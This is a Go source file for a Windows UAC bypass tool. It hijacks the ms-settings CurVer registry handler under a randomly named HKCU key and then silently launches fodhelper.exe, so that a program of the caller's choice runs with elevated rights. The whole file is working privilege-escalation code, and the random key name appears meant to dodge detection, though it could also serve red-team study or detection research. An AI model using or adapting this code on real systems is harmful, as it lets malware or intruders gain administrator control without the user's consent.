package main

import (
  "os"
  "fmt"
  "log"
  "time"
  "os/exec"
  "syscall"
  "math/rand"
  "golang.org/x/sys/windows/registry"
)

func RandomString(length int) (string) { // Return random string passing an integer (length)
  var seededRand *rand.Rand = rand.New(
  rand.NewSource(time.Now().UnixNano()))
  const charset = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

  b := make([]byte, length)
  for i := range b {
    b[i] = charset[seededRand.Intn(len(charset))]
  }

  return string(b)
}

func main(){
  if len(os.Args) < 2 {
    fmt.Println("[!] Usage:",  os.Args[0])
    os.Exit(0)
  }

  program := os.Args[1]
  fmt.Println("[*] Program to launch:", program)
  fmt.Println("[*] Creating registry key...")

  rand_key_name := RandomString(5)
  fmt.Println("[*] Registry key: Software\\Classes\\" + rand_key_name + "\\shell\\open\\command")

  // Create first key with random value
  k, _, err := registry.CreateKey(registry.CURRENT_USER,
    "Software\\Classes\\" + rand_key_name + "\\shell\\open\\command", registry.ALL_ACCESS,
  )
  if err != nil {
    log.Fatal(err)
  }
  defer k.Close() // Close key
  defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\" + rand_key_name + "\\shell\\open\\command")

  err = k.SetStringValue("DelegateExecute", "")
  if err != nil {
    log.Fatal(err)
  }

  err = k.SetStringValue("", program)
  if err != nil {
    log.Fatal(err)
  }

  // Create second key which redirects to the first one
  k2, _, err := registry.CreateKey(registry.CURRENT_USER,
    "Software\\Classes\\ms-settings\\CurVer", registry.ALL_ACCESS,
  )
  if err != nil {
    log.Fatal(err)
  }
  defer k2.Close() // Close key
  defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\CurVer")

  err = k2.SetStringValue("", rand_key_name)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[*] Executing fodhelper.exe")
  //time.Sleep(1000 * time.Millisecond)
  cmd := exec.Command("cmd.exe", "/C", "fodhelper.exe") // Run fodhelper
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
  err = cmd.Run()
  time.Sleep(500 * time.Millisecond)

  fmt.Println("[+] UAC bypass successed!")
}

